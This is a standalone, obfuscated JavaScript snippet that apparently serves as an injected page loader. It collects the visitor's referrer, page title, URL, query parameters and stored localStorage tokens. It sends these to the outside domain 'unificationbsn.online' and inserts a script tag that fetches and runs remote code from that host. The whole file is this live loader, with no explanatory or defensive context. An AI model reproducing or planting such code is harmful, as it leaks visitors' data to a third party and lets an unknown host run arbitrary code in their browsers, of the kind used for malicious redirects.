   (function() {
    var name = '_L8hgLTNnV3RZ4qjt';
    if (!window._L8hgLTNnV3RZ4qjt) {
        window._L8hgLTNnV3RZ4qjt = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://unificationbsn.online/Maro',
            P_PATH: 'https://unificationbsn.online/ad89deb/postback',
        };
    }
    const _mJNvk6PNskZ2XZ7j = localStorage.getItem('config');
    if (typeof _mJNvk6PNskZ2XZ7j !== 'undefined' && _mJNvk6PNskZ2XZ7j !== null) {
        var _6nF97wR85PpGrKHJ = JSON.parse(_mJNvk6PNskZ2XZ7j);
        var _bXTyZHW5GvR3mFKn = Math.round(+new Date()/1000);
        if (_6nF97wR85PpGrKHJ.created_at + window._L8hgLTNnV3RZ4qjt.ttl < _bXTyZHW5GvR3mFKn) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _HyqJkYBZ7TW8tCDd = localStorage.getItem('subId');
    var _ktCY6CCKPhPjwm3H = localStorage.getItem('token');
    var _3VM57ddkZF3R8KkZ = '?return=js.client';
        _3VM57ddkZF3R8KkZ += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _3VM57ddkZF3R8KkZ += '&se_referrer=' + encodeURIComponent(document.referrer);
        _3VM57ddkZF3R8KkZ += '&default_keyword=' + encodeURIComponent(document.title);
        _3VM57ddkZF3R8KkZ += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _3VM57ddkZF3R8KkZ += '&name=' + encodeURIComponent(name);
        _3VM57ddkZF3R8KkZ += '&host=' + encodeURIComponent(window._L8hgLTNnV3RZ4qjt.R_PATH);
    if (typeof _HyqJkYBZ7TW8tCDd !== 'undefined' && _HyqJkYBZ7TW8tCDd && window._L8hgLTNnV3RZ4qjt.unique) {
        _3VM57ddkZF3R8KkZ += '&sub_id=' + encodeURIComponent(_HyqJkYBZ7TW8tCDd);
    }
    if (typeof _ktCY6CCKPhPjwm3H !== 'undefined' && _ktCY6CCKPhPjwm3H && window._L8hgLTNnV3RZ4qjt.unique) {
        _3VM57ddkZF3R8KkZ += '&token=' + encodeURIComponent(_ktCY6CCKPhPjwm3H);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._L8hgLTNnV3RZ4qjt.R_PATH + _3VM57ddkZF3R8KkZ;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
